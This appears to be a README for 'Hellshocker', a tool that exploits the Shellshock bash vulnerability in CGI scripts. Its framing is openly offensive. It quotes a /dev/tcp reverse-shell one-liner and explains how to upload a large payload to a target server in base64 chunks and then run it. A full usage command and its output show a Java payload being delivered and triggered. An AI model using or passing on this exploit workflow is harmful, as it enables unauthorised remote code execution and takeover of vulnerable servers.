# Hellshocker 0.1.1

## Tool to exploit Shellshock vulnerability

Tired of using weak shellshock exploits or just "/bin/bash >& /dev/tcp/IP/port 0>&1" your way into the server?

Yes, you need to upload and execute something more complex to the server, and base64 encoding a huge file is impossible for your HTTP request to be accepted by the web-server.

Your problemas might be over with this tool. It is able to encode your payload into base64 and send it in chunks of (by default) 128 bytes to webserver and then, after it is sent, it decodes and gets executed.

"Wow", you say, "But I dont have PHP, I need something for Java."
No problem, I say, this tool is highly customizable.

Just look at this:

```bash
python hellshocker.py --cgi http://website.com/cgi-bin/vulnerable --payload "java.jar" --destination "/tmp/java.jar" --trigger "/usr/bin/java -jar /tmp/java.jar" --base64
[*] Splitting data into chunks ...
[+] Payload data has been encoded to base64 format.
[*] There is 19 chunks to be sent to remote server
[*] Starting payload upload ...
[*] Uploading chunk #1
[*] Uploading chunk #2
[*] Uploading chunk #3
[*] Uploading chunk #4
[*] Uploading chunk #5
[*] Uploading chunk #6
[*] Uploading chunk #7
[*] Uploading chunk #8
[*] Uploading chunk #9
[*] Uploading chunk #10
[*] Uploading chunk #11
[*] Uploading chunk #12
[*] Uploading chunk #13
[*] Uploading chunk #14
[*] Uploading chunk #15
[*] Uploading chunk #16
[*] Uploading chunk #17
[*] Uploading chunk #18
[*] Uploading chunk #19
[+] Upload procedure has been completed.
[*] Decoding base64-encoded payload on remote server ...
[+] Remote command for decoding has been sent successfully sent.
[*] Triggering payload to execute ...
[+] Trigger command for payload execution has been succesfully sent.
```

Then your payload was successfully transferred and executed. Cool, isn't it?
Yeah, it is.
